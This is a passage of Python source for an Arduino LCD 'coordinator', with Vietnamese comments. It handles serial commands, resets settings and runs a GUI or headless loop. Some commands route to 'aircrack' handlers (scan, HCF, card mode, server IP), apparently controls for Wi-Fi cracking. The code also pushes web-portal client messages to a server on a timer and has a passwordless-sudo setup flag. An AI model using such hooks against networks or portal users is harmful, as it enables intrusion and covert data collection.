                    if pkt.cmd == 0x36 and len(pkt.data) >= 1:
                        action = pkt.data[0]
                        extra = pkt.data[1] if len(pkt.data) > 1 else 0
                        self.handle_aircrack_action(action, extra)
                        continue
                    if pkt.cmd == 0x37 and len(pkt.data) >= 1:
                        self.handle_aircrack_scan_item_request(pkt.data[0])
                        continue
                    if pkt.cmd == 0x38 and len(pkt.data) >= 1:
                        self.handle_aircrack_hcf_item_request(pkt.data[0])
                        continue
                    if pkt.cmd == 0x3B and len(pkt.data) >= 2:
                        self.handle_aircrack_card_mode(pkt.data[0], pkt.data[1])
                        continue
                    if pkt.cmd == 0x3C:
                        # server IP string (neu de trong -> ve IP mac dinh)
                        ip_str = bytes(pkt.data).decode("utf-8", errors="replace") if pkt.data else ""
                        self.handle_aircrack_server_ip(ip_str)
                        continue

                    if pkt.cmd == 0x3D:
                        self.handle_restart_pi()
                        continue

                    if pkt.cmd == CMD_RESET_ALL_SETTINGS:
                        print("\n" + "=" * 65)
                        print("[SETTINGS] <<< ARDUINO YEU CAU KHOI PHUC CAI DAT GOC (RESET ALL DATA)!")
                        print("=" * 65)
                        self.settings = {
                            "system": {
                                "backlight": True,
                                "sound": True,
                                "device_name": "Arduino Uno R3",
                            },
                            "apps": {
                                "native_game": {
                                    "difficulty": 1,
                                    "high_score": 0,
                                },
                                "pc_test": {
                                    "echo_lcd": True,
                                },
                                "counter": {
                                    "saved_count": 0,
                                },
                            },
                            "last_updated": time.strftime("%Y-%m-%d %H:%M:%S"),
                        }
                        save_settings(self.settings)
                        print("[SETTINGS] >>> os_settings.json da duoc reset ve mac dinh (Backlight=ON, Sound=ON, Diff=1, HS=0, Count=0).")
                        continue

            except Exception as e:
                print(f"[COORDINATOR] Loi xu ly goi tin: {e}")

        # 3. Kiem tra dual-card push dinh ky moi 30s
        wh_cfg = self.settings.get("apps", {}).get("wifi_hotspot", {})
        if wh_cfg.get("dual_card_push", True) and (now - self.last_dual_push >= 30.0):
            self.last_dual_push = now
            if self.hotspot_service and self.sync_service and self.hotspot_service.check_upstream_online():
                msgs = []
                if hasattr(self, "web_portal_module") and self.web_portal_module:
                    try:
                        msgs = self.web_portal_module.load_messages()
                    except Exception:
                        pass
                self.sync_service.dual_card_push_to_server({"client_logs": msgs[:5], "last_modified": int(now)})

        # 4. Cap nhat giao dien
        if self.ui_visible:
            if self.has_gui:
                self.update_diagnostics_panel()
        else:
            if now - self.last_heartbeat_print >= 25.0:
                self.last_heartbeat_print = now
                is_ok = self.engine and self.engine.is_open
                st = "ONLINE" if is_ok else "OFFLINE"
                print(f"[{time.strftime('%H:%M:%S')}] [HEARTBEAT] Arduino: {self.port} [{st}] | Coordinator dang truc trong nen...")

    def _gui_after_loop(self) -> None:
        self.poll_serial_step()
        if self.running and self.root:
            self.root.after(10, self._gui_after_loop)

    def start(self) -> None:
        sys_cfg = self.settings.get("system", self.settings)
        mode_str = "NATIVE DESKTOP GUI" if self.has_gui else "LINUX HEADLESS CONSOLE (0% CPU)"

        print("\n" + "=" * 70)
        print("   ARDUINO LCD OS  |  CROSS-PLATFORM COORDINATOR [115200 BAUD]")
        print(f"   CHE DO: {mode_str}  |  HE DIEU HANH: {sys.platform.upper()}")
        print("=" * 70)
        print(f"  - File cai dat: {SETTINGS_FILE}")
        print(f"  - Cau hinh:     Backlight={sys_cfg.get('backlight')}, Sound={sys_cfg.get('sound')}")
        print("  - Quy trinh dieu phoi:")
        print("    1. Khi Arduino khoi dong / reset: Gui ngay settings (doi toi da 2s).")
        print("    2. Khi chon 'PC test' tren Arduino: Tu dong bat Live Display.")
        print("    3. Khi bam phim LEFT hoac Reset tren Arduino: Tu dong dong Live Display.")
        print("  - Nhan Ctrl+C trong terminal de dung.")
        print("=" * 70 + "\n")

        try:
            if self.has_gui and self.root:
                # Che do co man hinh: chay qua Tkinter Event Loop
                self.root.after(10, self._gui_after_loop)
                self.root.mainloop()
            else:
                # Che do Linux Server / Headless: chay vong lap Console
                while self.running:
                    self.poll_serial_step()
                    time.sleep(0.01)
        except KeyboardInterrupt:
            print("\n[COORDINATOR] Nguoi dung dung bang Ctrl+C.")
        finally:
            self.running = False
            if self.engine:
                try:
                    self.engine.close()
                except Exception:
                    pass
            print("[COORDINATOR] Da dong tien trinh an toan.")


if __name__ == "__main__":
    if "--setup-sudo" in sys.argv:
        success = setup_sudo_nopasswd_linux()
        sys.exit(0 if success else 1)

    if "--install-autostart" in sys.argv or "--autostart" in sys.argv or "--enable-autostart" in sys.argv:
        success = install_autostart()
        sys.exit(0 if success else 1)

    if "--remove-autostart" in sys.argv or "--disable-autostart" in sys.argv:
        success = remove_autostart()
        sys.exit(0 if success else 1)

    # Kiem tra Single-Instance Lock: Tu dong dong Coordinator cu neu dang chay de khoi dong moi
    mutex = SingleInstanceLock()
    if not mutex.acquire_or_takeover():
        print("\n" + ANSI_RED + "=" * 74 + ANSI_RESET)
        print(ANSI_BOLD + ANSI_RED + "  [LỖI] KHÔNG THỂ KHỞI ĐỘNG CENTRAL COORDINATOR!" + ANSI_RESET)
        print(ANSI_RED + "=" * 74 + ANSI_RESET)
        print(f"  Không thể chiếm giữ cổng khóa 127.0.0.1:{COORDINATOR_MUTEX_PORT}.")
        print("=" * 74 + "\n")
        sys.exit(1)

    try:
        p = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else None
        coord = CrossPlatformCoordinator(port=p)
        coord.start()
    finally:
        mutex.release()
